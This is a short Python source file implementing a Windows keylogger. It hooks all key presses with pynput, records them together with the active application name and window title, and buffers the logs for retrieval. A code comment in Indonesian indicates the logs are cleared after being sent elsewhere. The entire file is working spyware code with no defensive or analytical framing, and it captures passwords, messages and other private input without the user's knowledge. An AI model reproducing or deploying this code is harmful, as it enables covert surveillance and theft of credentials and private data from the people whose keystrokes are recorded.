import threading
import time
from datetime import datetime
from pynput import keyboard
import win32gui
import win32process
import psutil

class Keylogger:
    def __init__(self):
        self.log = []
        self.is_running = False
        self.listener = None
        self.current_app = ""
        self.current_window = ""
        self.lock = threading.Lock()
        self.last_entry = None

    def _get_active_window_info(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd == 0:
                return "Unknown", "Unknown"
            
            title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            app_name = process.name()
            return app_name, title
        except:
            return "Unknown", "Unknown"

    def _on_press(self, key):
        try:
            app_name, window_title = self._get_active_window_info()
            
            # Convert key to string representation
            key_str = ""
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = f"[{key.name}]" if hasattr(key, 'name') else str(key)

            with self.lock:
                # Jika app dan window sama dengan entri terakhir, gabungkan saja teksnya
                if self.last_entry and self.last_entry["app_name"] == app_name and self.last_entry["window_title"] == window_title:
                    self.last_entry["content"] += key_str
                    self.last_entry["last_timestamp"] = datetime.now().isoformat()
                else:
                    # Jika berbeda, buat entri baru
                    new_entry = {
                        "first_timestamp": datetime.now().isoformat(),
                        "last_timestamp": datetime.now().isoformat(),
                        "app_name": app_name,
                        "window_title": window_title,
                        "content": key_str
                    }
                    self.log.append(new_entry)
                    self.last_entry = new_entry

        except Exception as e:
            print(f"Error recording key: {e}")

    def start(self):
        if self.is_running:
            return
        
        self.is_running = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop(self):
        if not self.is_running:
            return
        
        self.is_running = False
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logs(self):
        """Ambil logs dan kosongkan buffer"""
        with self.lock:
            logs = self.log.copy()
            self.log = []
            self.last_entry = None # Reset agar entri berikutnya setelah kirim data dianggap baru
            return logs
